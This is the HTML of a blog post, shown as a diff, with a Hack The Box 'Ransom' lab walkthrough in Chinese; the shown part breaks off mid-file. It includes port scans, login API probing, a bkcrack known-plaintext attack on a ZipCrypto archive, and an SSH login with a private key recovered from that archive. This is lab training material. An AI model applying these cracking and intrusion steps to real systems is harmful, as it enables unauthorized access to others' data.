@@ -1,0 +1,677 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crazyinside">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738Crazy:~&#x2F;HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.153[sudo] crazyinside 的密码：Starting masscan 1.3.2 (">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Ransom">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Ransom.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738Crazy:~&#x2F;HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.153[sudo] crazyinside 的密码：Starting masscan 1.3.2 (">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Ransom.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823102530030.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823102848035.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823111730598.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823111820758.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823111938928.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112016664.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112334681.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112437618.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112802925.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.028Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.032Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Ransom.png">
+  
+  
+  
+  <title>HTB Walkthrough - Ransom - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Ransom"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          61 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Ransom</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Ransom.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.153</span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-23 02:14:47 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 22/tcp on 10.10.11.153                                    </span><br><span class="line">Discovered open port 80/tcp on 10.10.11.153                                    </span><br><span class="line">                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackThebox$ sudo nmap -sC -sV 10.10.11.153 -oN Ransom -p22,80                </span><br><span class="line">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-23 10:18 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.153</span><br><span class="line">Host is up (0.18s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)</span><br><span class="line">|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)</span><br><span class="line">|_  256 2221e9f485908745161f733641ee3b32 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">| http-title:  Admin - HTML5 Admin Template</span><br><span class="line">|_Requested resource was http://10.10.11.153/login</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 12.72 seconds</span><br><span class="line">zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.153 -oN Ransom -p22,80</span><br><span class="line">                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackThebox$ curl -I 10.10.11.153     </span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Date: Tue, 23 Aug 2022 02:21:36 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Cache-Control: no-cache, private</span><br><span class="line">Location: http://10.10.11.153/login</span><br><span class="line">Set-Cookie: XSRF-TOKEN=eyJpdiI6ImZzbUZENE9xSUx4TjJRNzRTWWtaZEE9PSIsInZhbHVlIjoicGJ2ZzhOb2NYVmQzeHAwdmtpWnpSWjQ3cFdtbEFpL3ZJQTA4aGNLSHhZaHNqVE9mcDVOU0hyTit6VVBPdGpGZTMzdTJXZExIRzNnM0xKa2ZzQm5mNUtSVXBlV0FsTVNnZnppNk1PTzBnN0dEVU1Bd2Y0djZNMjc3cjBCU2tRZC8iLCJtYWMiOiI0N2VjNzM4NTQ2ZWE3NjEwZTU3ZTI2NWJmMGJhNDZlNWMwZWNlODBkNWJjYzkwODVkMGFlNTFmNGFmMWQyMmU3IiwidGFnIjoiIn0%3D; expires=Tue, 23-Aug-2022 04:21:36 GMT; Max-Age=7200; path=/; samesite=lax</span><br><span class="line">Set-Cookie: laravel_session=eyJpdiI6InRQd0htU0o2ZmhFNjdRdzZ6VFVFNmc9PSIsInZhbHVlIjoiQlFEYjF4Y0hGenZ4Vk1iM0Q2N1NDaFJieEdtMWZJZnJhVkg0VSt3WDRIRCtPZEZnOGUvOE5PNnFKSU5DTmZSNjkxK21OSUpxZWF5dEJ3eUE0QmZHZ1JjRGVvc1RDejhFOUh1OE8zbXNhY05IcVM1ODVaT2k4SWFLSXlHYmdoNUsiLCJtYWMiOiIwNGJiYzBmMWE0MjZjYzE5ZTlmNmNhM2JiYTg4YTIxYWZhM2U1Yzg1NTBiMTgxYWMwNmQyZGNiZjUwNTc0YmM4IiwidGFnIjoiIn0%3D; expires=Tue, 23-Aug-2022 04:21:36 GMT; Max-Age=7200; path=/; samesite=lax</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823102530030.png" srcset="/img/loading.gif" lazyload alt="image-20220823102530030"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823102848035.png" srcset="/img/loading.gif" lazyload alt="image-20220823102848035"></p>
+<p>Get方式提交的参数。我尝试了目录枚举，它很慢，预计要40多分钟。我尝试了SQL注入，也不行。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login?password=password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ransom.htb</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ransom.htb/login</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>XSRF-TOKEN=eyJpdiI6Ik9odlh4bTlFK0NkbW0yaC8xczBSUHc9PSIsInZhbHVlIjoialhJb0VPSU9ZclJPL0dEem0xamJNVkpwL3R2TC9yazhxMWRyN0pCeFczTVdKSEpENHo4ZW1Mckp3Qk1DdWp6UmQrdUNxWG1iY0cvQWxjdTVOWnlzT0hjVzdFZjVmUGIxa3VZYkJQeUtwNW5Ba1ZTcXNMWGtQYzlLWW9QY3g4MzYiLCJtYWMiOiI1MGFkMTAxNjJhMTdlMTEyZWQ5YzcyNDRlMDZiYmFkYzYxNGM0YzJmMjYzZWFmYmQ4OGE5ZDY1YzI1OWIzMGVhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkZGRHR5ZGpleFIrWTM2V2M2WllUWWc9PSIsInZhbHVlIjoiWUpXTEYxV1FKZ2R4Y3dZbk9GUHhDM0g1YkdiT1RCQVg2OWNuRWFnVW9RSFJkUncyaDcxWnN4K3Q2MzhmemZjRXNUZlFlZk5VR1F6bWxCN3Z6SVVVUDdxSCtpZHg5Tit2QWdSN1pzU2JlckJEam9GRHQyUUhpckVBSTQzQU51Sy8iLCJtYWMiOiJhYmQ2Y2JkNmFlNjU5YjJjYmJhOGQ4ZWE1MzNiMTg2M2QzMGVmNWI3NDYxZDNkMmU0MDNhNmRkYjIzYTY2MWI3IiwidGFnIjoiIn0%3D</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<p>右键源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  $(<span class="string">&#x27;#loginform&#x27;</span>).<span class="title function_">submit</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">url</span>: <span class="string">&#x27;api/login&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">password</span>: $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>()</span></span><br><span class="line"><span class="language-javascript">          &#125;,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="language-javascript">          &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">if</span> (data === <span class="string">&#x27;Login Successful&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;alert&#x27;</span>)).<span class="property">style</span>.<span class="property">visibility</span> = <span class="string">&#x27;visible&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;alert&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;Invalid Login&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;);     </span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="literal">false</span>; </span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当提交密码会请求api&#x2F;login。</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823111730598.png" srcset="/img/loading.gif" lazyload alt="image-20220823111730598"></p>
+<p>POST方式不被允许：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823111820758.png" srcset="/img/loading.gif" lazyload alt="image-20220823111820758"></p>
+<p>支持GET方式json格式提交</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823111938928.png" srcset="/img/loading.gif" lazyload alt="image-20220823111938928"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112016664.png" srcset="/img/loading.gif" lazyload alt="image-20220823112016664"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112334681.png" srcset="/img/loading.gif" lazyload alt="image-20220823112334681"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112437618.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112802925.png" srcset="/img/loading.gif" lazyload alt="image-20220823112802925"></p>
+<p>都是ZipCrypto加密方式。顺着这个方式我去搜寻了很多资料。什么原理我也没搞懂。记不住原理就记步骤嘛。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox$ <span class="built_in">cp</span> ~/.bash_logout bash_logout</span><br><span class="line"></span><br><span class="line">Crazy:~/HackThebox$ zip plain.zip bash_logout </span><br><span class="line">  adding: bash_logout (deflated 28%)</span><br><span class="line">                                                                                                                                                                                     </span><br><span class="line">Crazy:~/HackThebox$ bkcrack -C uploaded-file-3422.zip -c .bash_logout -P plain.zip -p bash_logout </span><br><span class="line">bkcrack 1.5.0 - 2022-07-07</span><br><span class="line">[11:41:09] Z reduction using 151 bytes of known plaintext</span><br><span class="line">100.0 % (151 / 151)</span><br><span class="line">[11:41:10] Attack on 56903 Z values at index 6</span><br><span class="line">Keys: 7b549874 ebc25ec5 7e465e18</span><br><span class="line">75.6 % (43025 / 56903)</span><br><span class="line">[11:42:09] Keys</span><br><span class="line">7b549874 ebc25ec5 7e465e18</span><br><span class="line"></span><br><span class="line">Crazy:~/HackThebox$ bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U uploaded-file-3422-pass.zip pass</span><br><span class="line">bkcrack 1.5.0 - 2022-07-07</span><br><span class="line">[11:45:08] Writing unlocked archive uploaded-file-3422-pass.zip with password <span class="string">&quot;pass&quot;</span></span><br><span class="line">100.0 % (9 / 9)</span><br><span class="line">Wrote unlocked archive.</span><br></pre></td></tr></table></figure>
+
+<p>现在我可以用pass解开新生成的zip：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox$ unzip uploaded-file-3422-pass.zip</span><br><span class="line">Archive:  uploaded-file-3422-pass.zip</span><br><span class="line">[uploaded-file-3422-pass.zip] .bash_logout password: </span><br><span class="line">  inflating: .bash_logout            </span><br><span class="line">  inflating: .bashrc                 </span><br><span class="line">  inflating: .profile                </span><br><span class="line">   creating: .cache/</span><br><span class="line"> extracting: .cache/motd.legal-displayed  </span><br><span class="line"> extracting: .sudo_as_admin_successful  </span><br><span class="line">   creating: .ssh/</span><br><span class="line">  inflating: .ssh/id_rsa             </span><br><span class="line">  inflating: .ssh/authorized_keys    </span><br><span class="line">  inflating: .ssh/id_rsa.pub         </span><br><span class="line">  inflating: .viminfo                </span><br><span class="line">                                                                                                                                                                                     </span><br><span class="line">Crazy:~/HackThebox$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox/.ssh$ ssh -i id_rsa htb@10.10.11.153                                                  </span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.11.153 (10.10.11.153)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:hE6H4DrsHebfs+gclhz9SL77tMpy8aKR3vp8Y0NRDvY.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.11.153<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Mon Aug 22 15:11:40 2022 from 10.10.14.11</span></span><br><span class="line"><span class="string">htb@ransom:~$ </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">htb@ransom:/srv/prod$ grep -r <span class="string">&quot;Invalid Password&quot;</span></span><br><span class="line">app/Http/Controllers/AuthController.php:        <span class="built_in">return</span> <span class="string">&quot;Invalid Password&quot;</span>;</span><br><span class="line">htb@ransom:/srv/prod$ <span class="built_in">cat</span> app/Http/Controllers/AuthController.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use App\Models\User;</span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use App\Http\Requests\RegisterRequest;</span><br><span class="line">use Illuminate\Support\Facades\Auth;</span><br><span class="line">use Illuminate\Support\Facades\Hash;</span><br><span class="line"></span><br><span 